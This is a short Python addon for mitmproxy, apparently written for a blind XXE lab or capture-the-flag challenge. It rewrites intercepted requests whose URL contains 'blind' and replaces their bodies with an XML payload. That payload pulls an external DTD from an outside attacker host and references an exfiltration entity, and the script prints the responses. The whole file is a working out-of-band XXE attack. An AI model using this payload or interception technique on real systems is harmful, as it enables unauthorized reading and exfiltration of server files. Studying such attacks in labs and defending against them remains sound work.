from urllib.parse import urlencode, urlparse
import collections

from mitmproxy import http
from mitmproxy import ctx
      

XML = b"""
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY % remote SYSTEM "http://172.20.0.1:9090/files/szymaszyma/attack.dtd">%remote;
]>
<comment><text>test&send;</text></comment>
""".replace(b'\n', b'')

def request(flow: http.HTTPFlow) -> None:
  # Uncomment line below when trying to insert answer in comment.
  # return
  if 'blind' in flow.request.url:
      flow.request.headers['Content-Type'] = 'application/xml'
      flow.request.content = XML
      print(flow.request.content)


def response(flow: http.HTTPFlow) -> None:
  if 'blind' in flow.request.url:
    print(flow.response.content)
